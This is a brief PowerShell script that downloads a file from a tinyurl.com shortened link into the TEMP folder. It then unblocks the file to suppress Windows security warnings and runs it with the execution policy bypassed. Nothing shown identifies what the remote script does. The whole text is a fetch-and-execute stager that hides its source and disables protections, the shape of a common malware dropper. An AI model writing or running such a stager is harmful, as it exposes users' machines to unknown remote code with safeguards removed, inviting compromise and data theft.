$scriptUrl = "https://tinyurl.com/cpwrshell"
$localPath = "$env:TEMP\menu.ps1"

# Download the script
Invoke-WebRequest -Uri $scriptUrl -OutFile $localPath

# Unblock the file (prevents security warnings)
Unblock-File -Path $localPath

# Execute the script
PowerShell -ExecutionPolicy Bypass -File $localPath
